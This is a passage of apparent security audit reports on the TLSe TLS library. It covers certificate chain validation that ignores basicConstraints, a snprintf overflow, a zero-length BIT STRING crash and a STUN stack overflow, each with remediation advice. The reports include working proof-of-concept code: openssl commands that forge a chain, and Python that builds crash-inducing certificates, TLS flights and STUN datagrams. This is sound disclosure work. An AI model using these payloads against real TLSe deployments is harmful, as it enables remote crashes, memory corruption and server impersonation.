│                      context->dtls_data->fragment->len = data_length;        │
│                      context->dtls_data->fragment->written +=                │
│  fragment_length;                                                            │
│                                                                              │
│  Remediation                                                                 │
│  Enforce the missing invariant at the two points where the fragment state    │
│  is produced and consumed. When a fragment is stored, reject any datagram    │
│  for which the running total of fragment lengths would exceed the declared   │
│  message length, and size the reassembly buffer to exactly the declared      │
│  length rather than `data_length * sizeof(char *)`. When the reassembled     │
│  message is handed to the parser, additionally verify that the accumulated   │
│  length is non-negative, no larger than the declared length, and no larger   │
│  than `DTLS_MAX_FRAGMENT_SIZE` before it is used as a copy length into the   │
│  fixed stack buffer. Both bounds can be derived from the peer's own          │
│  handshake header, which is already capped at `DTLS_MAX_FRAGMENT_SIZE`, so   │
│  no additional negotiation is required. As defence in depth, move the 256    │
│  KiB `local_buffer` in `tls_parse_payload` off the stack or allocate it      │
│  once per context, and add regression coverage for fragmented DTLS           │
│  handshakes, which the project currently lacks.                              │
│                                                                              │
╰──────────────────────────────────────────────────────────────────────────────╯

╭─ VULN-0007 ──────────────────────────────────────────────────────────────────╮
│                                                                              │
│  Vulnerability Report                                                        │
│                                                                              │
│  Title: Chain validation ignores basicConstraints and keyUsage: a non-CA     │
│  certificate can issue certificates that TLSe reports as verified            │
│                                                                              │
│  Severity: HIGH                                                              │
│                                                                              │
│  CVSS Score: 7.4                                                             │
│                                                                              │
│  Target: TLSe (tlslayer) TLS library, `tlse.c` chain validation              │
│                                                                              │
│  Endpoint: tls_certificate_chain_is_valid_root() / tls_default_verify()      │
│  (TLS peer certificate chain validation)                                     │
│                                                                              │
│  CVSS Vector: AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:N                            │
│                                                                              │
│  Description                                                                 │
│  TLSe's chain validation never inspects `basicConstraints` or `keyUsage`.    │
│  Any certificate whose signature verifies against a chain reaching a loaded  │
│  trust anchor is accepted as an issuer, including certificates marked        │
│  `CA:FALSE` and certificates whose key usage excludes `keyCertSign`. A       │
│  party holding a single trusted end-entity certificate key can therefore     │
│  mint a certificate for any hostname that TLSe reports as verified, while    │
│  OpenSSL rejects the same chain.                                             │
│                                                                              │
│  Impact                                                                      │
│  The bar for impersonating an arbitrary server becomes possession of any     │
│  single trusted end-entity key instead of a CA key. That converts a leaked,  │
│  stolen or mis-issued leaf certificate into a universal impersonation        │
│  capability against TLSe-based clients and servers, and it defeats the       │
│  purpose of distinguishing CA certificates from leaf certificates in a PKI.  │
│  It also means subordinate certificates issued with a restricted name scope  │
│  or `pathLenConstraint` can be used to mint certificates outside that        │
│  scope.                                                                      │
│                                                                              │
│  Technical Analysis                                                          │
│  `tls_default_verify()` is the verifier the library installs when an         │
│  application loads trust anchors through the libssl-compatible wrapper       │
│  (`SSL_CTX_root_ca()` sets `ssl_data->certificate_verify =                   │
│  tls_default_verify`, tlse.c:14448-14449), so                                │
│  `tls_certificate_chain_is_valid_root()` is the trust decision for the       │
│  documented path.                                                            │
│                                                                              │
│  That function walks the supplied chain breadth-first. For each certificate  │
│  it checks expiry, then looks for an issuer among the loaded roots and       │
│  among the remaining chain members, and accepts as soon as one signature     │
│  verifies:                                                                   │
│                                                                              │
│  ```c title=tlse.c startLineNumber=11282 endLineNumber=11302                 │
│          for (rootindex = 0; rootindex < context->root_count; ++rootindex)   │
│  {                                                                           │
│              issuer = context->root_certificates[rootindex];                 │
│              if (!_private_tls_certificate_issuer_matches(certificate,       │
│  issuer) || tls_certificate_is_valid(issuer))                                │
│                  continue;                                                   │
│              if (_private_tls_certificate_verify_signature(certificate,      │
│  issuer, 1)) {                                                               │
│                  result = 0;                                                 │
│                  break;                                                      │
│              }                                                               │
│          }                                                                   │
│          if (!result)                                                        │
│              break;                                                          │
│          for (candidate = 1; candidate < len; ++candidate) {                 │
│              if (visited[candidate])                                         │
│                  continue;                                                   │
│              issuer = certificates[candidate];                               │
│              if (_private_tls_certificate_issuer_matches(certificate,        │
│  issuer) &&                                                                  │
│                  _private_tls_certificate_verify_signature(certificate,      │
│  issuer, 1)) {                                                               │
│                  visited[candidate] = 1;                                     │
│                  pending[count++] = candidate;                               │
│              }                                                               │
│          }                                                                   │
│  ```                                                                         │
│                                                                              │
│  The only additional constraint is                                           │
│  `_private_tls_certificate_public_key_is_safe()` applied to                  │
│  `certificates[0]`, which enforces a 2048-bit RSA / 224-bit EC minimum.      │
│  Nothing consults `basicConstraints`, `pathLenConstraint` or `keyUsage`,     │
│  and there is no field in the certificate model to consult:                  │
│                                                                              │
│  ```c title=tlse.c startLineNumber=1602 endLineNumber=1637                   │
│  struct TLSCertificate {                                                     │
│      unsigned short version;                                                 │
│      unsigned int algorithm;                                                 │
│      unsigned int key_algorithm;                                             │
│      unsigned int ec_algorithm;                                              │
│      unsigned char *exponent;                                                │
│      unsigned int exponent_len;                                              │
│      unsigned char *pk;                                                      │
│      unsigned int pk_len;                                                    │
│      ...                                                                     │
│      unsigned char *fingerprint;                                             │
│      unsigned char *der_bytes;                                               │
│      unsigned int der_len;                                                   │
│      unsigned char *bytes;                                                   │
│      unsigned int len;                                                       │
│  };                                                                          │
│  ```                                                                         │
│                                                                              │
│  `_private_asn1_parse()` records subject, issuer, serial, validity dates     │
│  and SANs but no extension content, so a certificate's `CA` bit and          │
│  `keyCertSign` usage are simply not available to any caller. Consequently a  │
│  certificate that is explicitly marked as not being a CA, and explicitly     │
│  forbidden from signing certificates, is accepted as an intermediate         │
│  issuer. The same applies to `pathLenConstraint`: a subordinate CA           │
│  restricted to zero further subordinates can issue further CAs, and every    │
│  certificate in the chain — including the leaf — may act as an issuer.       │
│                                                                              │
│  PoC Description                                                             │
│  1. Generate a root CA (`CA:TRUE`), and a non-CA certificate `evil` signed   │
│  by it whose `basicConstraints` is `critical,CA:FALSE` and whose `keyUsage`  │
│  is `critical,digitalSignature` (no `keyCertSign`).                          │
│  2. Using only `evil`'s private key, sign a target certificate `victim` for  │
│  `CN=victim.example.com` with `basicConstraints=CA:FALSE`.                   │
│  3. Load `root` as the only trust anchor into a TLS context and call         │
│  `tls_certificate_chain_is_valid_root()` (or `tls_default_verify()`, which   │
│  `SSL_CTX_root_ca()` installs) on the chain `[victim, evil]`.                │
│  4. Observe `chain_is_valid_root = 0` and `default_verify = no_error`: the   │
│  chain is accepted even though `evil` is not a CA and may not sign           │
│  certificates.                                                               │
│  5. Compare with `openssl verify`, which rejects the identical chain with    │
│  `error 79: invalid CA certificate` and `error 32: key usage does not        │
│  include certificate signing`.                                               │
│                                                                              │
│  PoC Code                                                                    │
│  ```bash                                                                     │
│  # PKI setup (all local, no network)                                         │
│  openssl req -x509 -newkey rsa:2048 -nodes -keyout root.key -out root.crt    │
│  -days 3650 \                                                                │
│    -subj "/CN=Test Root CA" -addext "basicConstraints=critical,CA:TRUE"      │
│  openssl req -newkey rsa:2048 -nodes -keyout evil.key -out evil.csr -subj    │
│  "/CN=not-a-ca.example.com"                                                  │
│  printf                                                                      │
│  "basicConstraints=critical,CA:FALSE\nkeyUsage=critical,digitalSignature\n"  │
│  > evil.ext                                                                  │
│  openssl x509 -req -in evil.csr -CA root.crt -CAkey root.key                 │
│  -CAcreateserial \                                                           │
│    -out evil.crt -days 365 -extfile evil.ext                                 │
│  openssl req -newkey rsa:2048 -nodes -keyout victim.key -out victim.csr      │
│  -subj "/CN=victim.example.com"                                              │
│  printf                                                                      │
│  "basicConstraints=critical,CA:FALSE\nsubjectAltName=DNS:victim.example.com  │
│  \n" > victim.ext                                                            │
│  # the victim certificate is signed by a NON-CA key                          │
│  openssl x509 -req -in victim.csr -CA evil.crt -CAkey evil.key               │
│  -CAcreateserial \                                                           │
│    -out victim.crt -days 365 -extfile victim.ext                             │
│                                                                              │
│  # differential control: a compliant validator rejects the chain             │
│  openssl verify -CAfile root.crt -untrusted evil.crt victim.crt   # exit 2,  │
│  error 79 / error 32                                                         │
│                                                                              │
│  # TLSe accepts it                                                           │
│  openssl x509 -in evil.crt -outform DER -out evil.der                        │
│  openssl x509 -in victim.crt -outform DER -out victim.der                    │
│  ./harness chainroot root.crt victim.der evil.der                            │
│  # chain_is_valid=0                                                          │
│  # roots_loaded=1                                                            │
│  # chain_is_valid_root=0                                                     │
│  # default_verify=255                                                        │
│  ```                                                                         │
│                                                                              │
│  `harness` is a small driver over the public API:                            │
│                                                                              │
│  ```c                                                                        │
│  /* chainroot <roots.pem> <der>... */                                        │
│  ctx = tls_create_context(0, TLS_V12);                                       │
│  tls_load_root_certificates(ctx, roots_pem, roots_len);                      │
│  printf("chain_is_valid_root=%d\n",                                          │
│  tls_certificate_chain_is_valid_root(ctx, chain, n));                        │
│  printf("default_verify=%d\n", tls_default_verify(ctx, chain, n));           │
│  ```                                                                         │
│                                                                              │
│  Code Locations                                                              │
│                                                                              │
│    Location 1: tlse.c:11286-11289                                            │
│    The accept decision: result = 0 is set from signature verification        │
│  alone, with no check on the issuer's basicConstraints/pathLen/keyUsage      │
│                if (_private_tls_certificate_verify_signature(certificate,    │
│  issuer, 1)) {                                                               │
│                  result = 0;                                                 │
│                  break;                                                      │
│              }                                                               │
│                                                                              │
│    Location 2: tlse.c:1602-1637                                              │
│    The certificate model has no CA bit, pathLen or keyUsage field, and the   │
│  parser never records those extensions                                       │
│    struct TLSCertificate {                                                   │
│      unsigned short version;                                                 │
│      unsigned int algorithm;                                                 │
│      unsigned int key_algorithm;                                             │
│      unsigned int ec_algorithm;                                              │
│                                                                              │
│  Remediation                                                                 │
│  Parse and record the `basicConstraints` extension (OID 2.5.29.19) — the CA  │
│  boolean and, when present, `pathLenConstraint` — and the `keyUsage`         │
│  extension (OID 2.5.29.15) `keyCertSign` bit, on every certificate the       │
│  parser accepts. In the chain walker, require `CA == TRUE` and               │
│  `keyCertSign` for every certificate used as an issuer of another            │
│  certificate, and carry a path-length counter that is initialised from the   │
│  first CA's `pathLenConstraint` and decremented for each intermediate;       │
│  reject the chain when it is exhausted. Treat a certificate that lacks       │
│  `basicConstraints` as a non-CA (the default per RFC 5280). Apply the same   │
│  rule to certificates taken from the supplied chain and to the loaded trust  │
│  anchors, or document explicitly that anchors are trusted unconditionally.   │
│                                                                              │
╰──────────────────────────────────────────────────────────────────────────────╯

╭─ VULN-0008 ──────────────────────────────────────────────────────────────────╮
│                                                                              │
│  Vulnerability Report                                                        │
│                                                                              │
│  Title: Out-of-bounds write in tls_certificate_to_string(): negative size    │
│  passed to snprintf once the rendered peer certificate exceeds the caller's  │
│  buffer                                                                      │
│                                                                              │
│  Severity: HIGH                                                              │
│                                                                              │
│  CVSS Score: 7.5                                                             │
│                                                                              │
│  Target: TLSe (tlslayer) TLS library, `tlse.c` certificate rendering         │
│                                                                              │
│  Endpoint: tls_certificate_to_string() (public API, declared in tlse.h:234)  │
│                                                                              │
│  CVSS Vector: AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H                            │
│                                                                              │
│  Description                                                                 │
│  `tls_certificate_to_string()` accumulates the output length from            │
│  `snprintf()` return values and then uses `len - res` as the size for the    │
│  next call. Once the rendered text exceeds the caller's buffer, `res` is     │
│  greater than `len`, the subtraction yields a negative `int` that is         │
│  converted to a huge `size_t`, and `snprintf()` writes past the end of the   │
│  caller's buffer. The amount of text is derived from attacker-controlled     │
│  certificate fields, so a hostile certificate overflows a fixed-size buffer  │
│  with attacker-chosen bytes.                                                 │
│                                                                              │
│  Impact                                                                      │
│  An attacker who presents a certificate to a TLSe-based server or client     │
│  that renders the peer certificate crashes or corrupts memory in the         │
│  application process. Because the write is a formatted string built from     │
│  certificate bytes, the bytes written past the buffer are                    │
│  attacker-influenced. The demonstrated effect is an out-of-bounds write      │
│  into adjacent heap or stack memory; code execution was not demonstrated,    │
│  so the rated impact is loss of availability of the process.                 │
│                                                                              │
│  Technical Analysis                                                          │
│  The function accumulates its output position from `snprintf()` return       │
│  values:                                                                     │
│                                                                              │
│  ```c title=tlse.c startLineNumber=4612 endLineNumber=4613                   │
│      if (cert->version) {                                                    │
│          int res = snprintf(buffer, len, "X.509v%i certificate\n  Issued     │
│  by: [%s]%s (%s)\n  Issued to: [%s]%s (%s, %s)\n  Subject: %s\n  Validity:   │
│  %s - %s\n  OCSP: %s\n  Serial number: ",                                    │
│  ```                                                                         │
│                                                                              │
│  `snprintf()` returns the number of characters that *would* have been        │
│  written. When the formatted output is longer than `len`, `res` becomes      │
│  greater than `len`. Every subsequent append passes `len - res`:             │
│                                                                              │
│  ```c title=tlse.c startLineNumber=4716 endLineNumber=4719                   │
│          res += snprintf(buffer + res, len - res, "):\n");                   │
│          if (res > 0) {                                                      │
│              for (i = 0; i < cert->pk_len; i++)                              │
│                  res += snprintf(buffer + res, len - res, "%02x",            │
│  (int)cert->pk[i]);                                                          │
│  ```                                                                         │
│                                                                              │
│  `len - res` is an `int` and is negative, but the `size_t` parameter of      │
│  `snprintf()` makes it an enormous value, and the destination `buffer +      │
│  res` is already past the end of the caller's allocation. The result is a    │
│  formatted write of attacker-derived bytes at an attacker-influenced         │
│  offset.                                                                     │
│                                                                              │
│  The inputs are all remote: `pk_len` comes from the subjectPublicKeyInfo     │
│  BIT STRING or the RSA modulus INTEGER, `sign_len` from the signature BIT    │
│  STRING, `serial_len` from the serial INTEGER, and                           │
│  `subject`/`issuer_*`/`san` are copied from the certificate's name and SAN   │
│  fields with no length limit below the handshake size. The function is       │
│  exported in the public header (`tlse.h:234`) and the repository's own       │
│  example server renders the peer certificate into `char out_buffer[0xFFF]`.  │
│                                                                              │
│  Realistic sizes: a 3000-byte signature BIT STRING yields 6000 hex           │
│  characters, which alone exceeds a 4095-byte buffer. A subject common name   │
│  longer than the buffer overflows on the first `snprintf`.                   │
│                                                                              │
│  PoC Description                                                             │
│  1. Take any valid certificate and re-encode it so the outer                 │
│  `signatureValue` BIT STRING holds 3000 bytes instead of 256 (`der_tools.py  │
│  huge_sig`); the structure stays valid DER, only lengths change.             │
│  2. Parse the result with `tls_certificate_parse()` — it succeeds, and the   │
│  certificate's `sign_len` becomes 3001.                                      │
│  3. Call `tls_certificate_to_string(cert, buffer, 4095)` with the same       │
│  4095-byte buffer size that `examples/tlshelloworld.c` uses.                 │
│  4. Observe the AddressSanitizer heap-buffer-overflow: `WRITE of size 3` in  │
│  `snprintf` called from `tls_certificate_to_string` (tlse.c:4751), with the  │
│  write target beyond the end of the allocation.                              │
│  5. A certificate whose subject or issuer string is longer than the buffer   │
│  produces the same overflow on the initial format, because the first         │
│  `snprintf` alone drives `res` past `len`.                                   │
│                                                                              │
│  PoC Code                                                                    │
│  ```python                                                                   │
│  #!/usr/bin/env python3                                                      │
│  # Re-encode a valid certificate with a 3000-byte signatureValue BIT         │
│  STRING.                                                                     │
│  import sys                                                                  │
│                                                                              │
│  def enc(tag, body):                                                         │
│      n = len(body)                                                           │
│      if n < 0x80:                                                            │
│          return bytes([tag, n]) + body                                       │
│      nb = n.to_bytes((n.bit_length() + 7) // 8, "big")                       │
│      return bytes([tag, 0x80 | len(nb)]) + nb + body                         │
│                                                                              │
│  def parse(data):                                                            │
│      tag, first = data[0], data[1]                                           │
│      if first < 0x80:                                                        │
│          ln, off = first, 2                                                  │
│      else:                                                                   │
│          k = first & 0x7F                                                    │
│          ln, off = int.from_bytes(data[2:2+k], "big"), 2 + k                 │
│      content = data[off:off+ln]                                              │
│      if tag & 0x20:                                                          │
│          kids, p = [], 0                                                     │
│          while p < len(content):                                             │
│              sub = parse(content[p:])                                        │
│              kids.append(sub)                                                │
│              p += len(enc(sub[0], sub[1] if not sub[2] else                  │
│  b"".join(bytes([k[0]]) for k in [])) or b"")                                │
│          return (tag, content, kids)                                         │
│      return (tag, content, None)                                             │
│                                                                              │
│  # Simpler: operate on raw TLVs of the outer SEQUENCE only.                  │
│  def tlvs(buf):                                                              │
│      out, p = [], 0                                                          │
│      while p < len(buf):                                                     │
│          tag, first = buf[p], buf[p+1]                                       │
│          if first < 0x80:                                                    │
│              ln, off = first, p + 2                                          │
│          else:                                                               │
│              k = first & 0x7F                                                │
│              ln, off = int.from_bytes(buf[p+2:p+2+k], "big"), p + 2 + k      │
│          out.append(buf[p:off+ln])                                           │
│          p = off + ln                                                        │
│      return out                                                              │
│                                                                              │
│  der = open(sys.argv[1], "rb").read()                                        │
│  inner = tlvs(der[2:] if der[1] < 0x80 else der[2 + (der[1] & 0x7F):])       │
│  tbs, alg = inner[0], inner[1]                                               │
│  sig = bytes([0x03]) + b"\x00" + b"\x41" * 3000          # BIT STRING,       │
│  attacker-sized                                                              │
│  big = bytes([0x03, 0x80 | ((len(sig) - 2 + 2).bit_length() + 7) // 8])      │
│  # encode the new signatureValue TLV properly                                │
│  n = len(sig) - 2                                                            │
│  if n < 0x80:                                                                │
│      sig_tlv = bytes([0x03, n]) + sig[2:]                                    │
│  else:                                                                       │
│      nb = n.to_bytes((n.bit_length() + 7) // 8, "big")                       │
│      sig_tlv = bytes([0x03, 0x80 | len(nb)]) + nb + sig[2:]                  │
│  out = enc(0x30, tbs + alg + sig_tlv)                                        │
│  open(sys.argv[2], "wb").write(out)                                          │
│  print("wrote", sys.argv[2], len(out), "bytes")                              │
│  ```                                                                         │
│                                                                              │
│  The C side mirrors the bundled example:                                     │
│                                                                              │
│  ```c                                                                        │
│  cert = tls_certificate_parse(der, der_len);        /* parses fine,          │
│  sign_len = 3001 */                                                          │
│  char out_buffer[0xFFF];                            /*                       │
│  examples/tlshelloworld.c */                                                 │
│  tls_certificate_to_string(cert, out_buffer, sizeof(out_buffer));   /* OOB   │
│  write */                                                                    │
│  ```                                                                         │
│                                                                              │
│  Code Locations                                                              │
│                                                                              │
│    Location 1: tlse.c:4716-4719                                              │
│    Accumulating snprintf idiom: len - res goes negative once res > len, and  │
│  buffer + res is already out of bounds                                       │
│            res += snprintf(buffer + res, len - res, "):\n");                 │
│          if (res > 0) {                                                      │
│              for (i = 0; i < cert->pk_len; i++)                              │
│                  res += snprintf(buffer + res, len - res, "%02x",            │
│  (int)cert->pk[i]);                                                          │
│                                                                              │
│    Location 2: tlse.c:4612-4613                                              │
│    Where res first exceeds len: the header format embeds                     │
│  attacker-controlled subject/issuer/OCSP strings and the return value is     │
│  kept even when truncated                                                    │
│        if (cert->version) {                                                  │
│          int res = snprintf(buffer, len, "X.509v%i certificate\n  Issued     │
│  by: [%s]%s (%s)\n  Issued to: [%s]%s (%s, %s)\n  Subject: %s\n  Validity:   │
│  %s - %s\n  OCSP: %s\n  Serial number: ",                                    │
│                                                                              │
│  Remediation                                                                 │
│  Never use the return value of `snprintf()` as the current offset when it    │
│  may indicate truncation. Introduce a bounded append helper that takes the   │
│  buffer, the current offset and the buffer size, clamps the offset to the    │
│  buffer size, returns the buffer size once full so later appends become      │
│  no-ops, and always NUL-terminates. Replace every `res += snprintf(buffer +  │
│  res, len - res, ...)` in `tls_certificate_to_string()` with that helper,    │
│  and break out of the public-key and signature hex loops as soon as the      │
│  buffer is full. Also reject a non-positive buffer size at entry. Because    │
│  roughly forty call sites share the same idiom, the replacement must be      │
│  applied to all of them; converting only the loops that were demonstrated    │
│  leaves the subject/issuer and SAN paths able to overflow the same way.      │
│                                                                              │
╰──────────────────────────────────────────────────────────────────────────────╯

╭─ VULN-0001 (updated) ────────────────────────────────────────────────────────╮
│                                                                              │
│  Vulnerability Report                                                        │
│                                                                              │
│  Title: Zero-length BIT STRING in X.509 DER causes memcpy with size -1       │
│  (remote crash) in TLSe                                                      │
│                                                                              │
│  Severity: HIGH                                                              │
│                                                                              │
│  CVSS Score: 7.5                                                             │
│                                                                              │
│  Target: TLSe (tlslayer) TLS library snapshot                                │
│                                                                              │
│  CVSS Vector: AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H                            │
│                                                                              │
│  Description                                                                 │
│  A zero-length BIT STRING in an X.509 DER structure makes the ASN.1 parser   │
│  pass a length of -1 into tls_certificate_set_copy(), which calls memcpy()   │
│  with SIZE_MAX. A TLS peer presenting such a certificate - or any            │
│  application calling the public tls_certificate_parse() on                   │
│  attacker-supplied DER - crashes the process. The trigger is an 11-byte DER  │
│  blob.                                                                       │
│                                                                              │
│  Impact                                                                      │
│  A remote unauthenticated peer can terminate the TLS-hosting process. A      │
│  malicious or MITM server crashes any TLSe client by appending one           │
│  malformed Certificate message to its ServerHello; a TLSe server crashes     │
│  when parsing a client certificate in a mutual-TLS deployment. Because the   │
│  memcpy size is SIZE_MAX the copy always faults at the first unmapped page,  │
│  so the effect is a reliable per-connection crash rather than a controlled   │
│  heap write. Applications that load or inspect certificates from files,      │
│  configuration or an API via tls_certificate_parse() crash on a single       │
│  crafted blob.                                                               │
│                                                                              │
│  Technical Analysis                                                          │
│  _private_asn1_parse() recurses through the DER tree tracking fields[] (the  │
│  child index at each level). A primitive BIT STRING that is the third child  │
│  (idx == 3) of the second nesting level, whose parent is the first child of  │
│  the outer SEQUENCE (fields[0] == 1), is handed to                           │
│  tls_certificate_set_sign_key() at tlse.c:11590. That helper                 │
│  (tlse.c:4597-4605) strips a leading zero byte without checking that         │
│  content remains, so a zero-length BIT STRING makes len become -1.           │
│  tls_certificate_set_copy() (tlse.c:4546-4558) only rejects len == 0, so     │
│  TLS_MALLOC(len + 1) becomes malloc(0) and memcpy(dst, src, (size_t)-1) is   │
│  executed, which always faults.\n\nReachability: tls_consume_stream() ->     │
│  tls_parse_message() -> _private_tls_consume_handshake() ->                  │
│  tls_parse_payload() -> tls_parse_certificate() -> asn1_parse() ->           │
│  _private_asn1_parse(), i.e. the certificate comes straight from the wire.   │
│  The same expression is reachable with no handshake at all through the       │
│  exported tls_certificate_parse() API.\n\nThe 0x00 byte checked by val[0]    │
│  is the tag byte of the TLV that follows the zero-length BIT STRING, so the  │
│  trigger is fully attacker-controlled.                                       │
│                                                                              │
│  PoC Description                                                             │
│  1. Write the 11-byte DER blob 3008050005000300000000 to a file; it is a     │
│  SEQUENCE whose first element is a SEQUENCE containing three elements, the   │
│  third a zero-length BIT STRING followed by a 0x00 byte.\n2. Feed it to      │
│  tls_certificate_parse() for the minimal local reproduction.\n3. For the     │
│  remote reproduction, wrap the DER in a Certificate handshake message:       │
│  certificate_list length 0x00000e, certificate length 0x00000b, then the     │
│  DER, wrapped in handshake type 0x0b inside a TLS record of type 0x16.\n4.   │
│  Prepend a ServerHello record so the handshake state machine accepts the     │
│  Certificate, then feed the 105-byte stream to a TLS client context through  │
│  tls_consume_stream().\n5. Both cases abort: the instrumented build reports  │
│  AddressSanitizer negative-size-param (size=-1) in memcpy; the               │
│  uninstrumented build aborts in glibc malloc or dies with SIGSEGV.           │
│                                                                              │
│  PoC Code                                                                    │
│  ```python\n# Minimal DER: SEQUENCE { SEQUENCE { NULL, NULL, BIT STRING      │
│  len=0 } 0x00 0x00 }\nDER = bytes.fromhex("3008050005000300000000")\n\ndef   │
│  certificate_record(der):\n    body = b"\x00\x00\x0e" +                      │
│  len(der).to_bytes(3, "big") + der\n    hs   = b"\x0b" +                     │
│  len(body).to_bytes(3, "big") + body\n    return b"\x16\x03\x03" +           │
│  len(hs).to_bytes(2, "big") + hs\n\nopen("poc.der", "wb").write(DER)   #     │
│  local: tls_certificate_parse()\n\nserver_hello = bytes.fromhex(\n           │
│  "160301004a0200004603"\n                                                    │
│  "036afc2dabbc4b8d3de57f4b06cdec6f7c848436907f19fcf3f9d3f1e256"\n            │
│  "8ff6222029f918402858326e43509c292ef48162eefe435590c310228c0f"\n            │
│  "a134ca622177c013001")\nflight = server_hello +                             │
│  certificate_record(DER)\nopen("poc_flight.bin", "wb").write(flight)  #      │
│  remote: tls_consume_stream()\nprint(len(flight), flight.hex())\n```         │
│                                                                              │
│  Code Locations                                                              │
│                                                                              │
│    Location 1: tlse.c:4597-4601                                              │
│    Root cause: leading zero stripped without checking that content remains   │
│    Fix:                                                                      │
│    - void tls_certificate_set_sign_key(struct TLSCertificate *cert, const    │
│  unsigned char *val, int len) {                                              │
│      if (!val[0]) {                                                          │
│          val++;                                                              │
│          len--;                                                              │
│      }                                                                       │
│    + void tls_certificate_set_sign_key(struct TLSCertificate *cert, const    │
│  unsigned char *val, int len) {                                              │
│      if ((len > 0) && (!val[0])) {                                           │
│          val++;                                                              │
│          len--;                                                              │
│      }                                                                       │
│                                                                              │
│    Location 2: tlse.c:4549-4557                                              │
│    Defence in depth: reject non-positive lengths and never leave a freed     │
│  pointer behind                                                              │
│    Fix:                                                                      │
│    -     TLS_FREE(*member);                                                  │
│      if (len) {                                                              │
│          *member = (unsigned char *)TLS_MALLOC(len + 1);                     │
│          if (*member) {                                                      │
│              memcpy(*member, val, len);                                      │
│              (*member)[len] = 0;                                             │
│          }                                                                   │
│      } else                                                                  │
│          *member = NULL;                                                     │
│  }                                                                           │
│    +     TLS_FREE(*member);                                                  │
│      *member = NULL;                                                         │
│      if (len > 0) {                                                          │
│          *member = (unsigned char *)TLS_MALLOC(len + 1);                     │
│          if (*member) {                                                      │
│              memcpy(*member, val, len);                                      │
│              (*member)[len] = 0;                                             │
│          }                                                                   │
│      }                                                                       │
│  }                                                                           │
│                                                                              │
│  Remediation                                                                 │
│  Perform the leading-zero strip in tls_certificate_set_sign_key() only when  │
│  the element actually has content, and make tls_certificate_set_copy()       │
│  treat every non-positive length as "no value" while clearing the            │
│  destination pointer. Note that fixing only the copy helper is               │
│  insufficient: the pointer is already advanced past the value, so the        │
│  length guard in the caller is required as well. Add DER fuzz coverage for   │
│  zero-length primitive elements to prevent regressions.                      │
│                                                                              │
╰──────────────────────────────────────────────────────────────────────────────╯

╭─ VULN-0002 (updated) ────────────────────────────────────────────────────────╮
│                                                                              │
│  Vulnerability Report                                                        │
│                                                                              │
│  Title: Stack buffer overflow in tls_stun_parse() key construction           │
│  (WebRTC/STUN, pre-auth)                                                     │
│                                                                              │
│  Severity: HIGH                                                              │
│                                                                              │
│  CVSS Score: 8.2                                                             │
│                                                                              │
│  Target: TLSe (tlslayer) TLS library snapshot - STUN / WebRTC DTLS path      │
│                                                                              │
│  CVSS Vector: AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:H/A:L                            │
│                                                                              │
│  Description                                                                 │
│  tls_stun_parse() builds a "username:realm:password" string in a 1230-byte   │
│  stack buffer without bounding the attribute lengths it has already          │
│  accepted. A STUN binding request whose USERNAME (up to 513 bytes) and       │
│  REALM (up to 763 bytes) attributes are both maximal overflows the buffer    │
│  by up to 47 bytes with fully attacker-controlled data. The write happens    │
│  before MESSAGE-INTEGRITY is checked, so an unauthenticated single UDP       │
│  datagram triggers it.                                                       │
│                                                                              │
│  Impact                                                                      │
│  An unauthenticated attacker who can send a UDP datagram to a TLSe           │
│  WebRTC/DTLS peer connection writes up to 47 bytes of fully controlled data  │
│  past a 1230-byte stack buffer, corrupting the tls_stun_parse() frame. The   │
│  overwritten region holds other locals of that frame, so the immediate       │
│  demonstrated effect is corruption of program state in the TLS terminator    │
│  plus an AddressSanitizer-detected abort; whether the overwrite reaches      │
│  saved control data depends on the compiler's frame layout, and code         │
│  execution was not demonstrated. Because the parser runs before any DTLS     │
│  handshake or STUN authentication, no credential is required.                │
│                                                                              │
│  Technical Analysis                                                          │
│  tls_stun_parse() (tlse.c:13070) declares `char key[0x4CE]` at               │
│  tlse.c:13085. Attribute handlers accept USERNAME up to 513 bytes            │
│  (tlse.c:13184) and REALM up to 763 bytes (tlse.c:13233); nothing checks     │
│  their sum against the destination, and the caller passes the                │
│  library-generated 24-character local_pwd, so the maximum concatenation is   │
│  513 + 1 + 763 + 1 + 24 + 1 = 1303 bytes against a 1230-byte buffer.\n\nThe  │
│  copies happen inside the MESSAGE-INTEGRITY handler (tlse.c:13201-13210)     │
│  while assembling the HMAC key, i.e. before the integrity value is computed  │
│  or compared, so no authentication is required. The same block also          │
│  contains a separate defect: `ptr += username_len;` after copying the REALM  │
│  advances by the wrong length, so the second separator and the password are  │
│  written at incorrect offsets.\n\nEntry point: tls_peerconnection_iterate()  │
│  at tlse.c:14006 calls tls_stun_parse() for any datagram that tls_is_stun()  │
│  accepts, and tls_is_stun() only verifies the four magic-cookie bytes        │
│  0x2112A442. The parser is therefore reachable pre-authentication from one   │
│  spoofable UDP datagram in any product using the WebRTC DTLS-SRTP support.   │
│                                                                              │
│  PoC Description                                                             │
│  1. Build a STUN binding request: type 0x0001, attribute section length      │
│  0x0520, magic cookie 0x2112A442, a 12-byte transaction ID.\n2. Append a     │
│  USERNAME attribute (type 0x0006) with 513 bytes of filler, a REALM          │
│  attribute (type 0x0014) with 763 bytes of filler, and a MESSAGE-INTEGRITY   │
│  attribute (type 0x0008) with 20 zero bytes. The 513 and 763 limits are      │
│  exactly the maxima the parser permits.\n3. Deliver the 1332-byte datagram   │
│  to tls_peerconnection_iterate() through a TLSRTCPeerConnection created      │
│  with tls_peerconnection_context().\n4. tls_is_stun() accepts it on the      │
│  magic cookie alone; tls_stun_parse() builds the "username:realm:password"   │
│  key and writes 47 bytes past char key[0x4CE].\n5. The instrumented build    │
│  reports AddressSanitizer stack-buffer-overflow (WRITE of size 763) at       │
│  tlse.c:13210.                                                               │
│                                                                              │
│  PoC Code                                                                    │
│  ```python\nimport struct\n\ndef attr(kind, value):\n    pad = (4 -          │
│  len(value) % 4) % 4\n    return struct.pack(">HH", kind, len(value)) +      │
│  value + b"\x00" * pad\n\nusername = b"U" * 513          # max accepted by   │
│  the parser\nrealm    = b"R" * 763          # max accepted by the            │
│  parser\nintegrity = b"\x00" * 20\n\nattrs = attr(0x0006, username) +        │
│  attr(0x0014, realm) + attr(0x0008, integrity)\nstun  = struct.pack(">HH",   │
│  0x0001, len(attrs)) + b"\x21\x12\xa4\x42" + b"T" * 12 + attrs\nassert       │
│  len(stun) == 1332\nopen("stun_poc.bin",                                     │
│  "wb").write(stun)\nprint(stun.hex())\n```\n\nDelivered through the          │
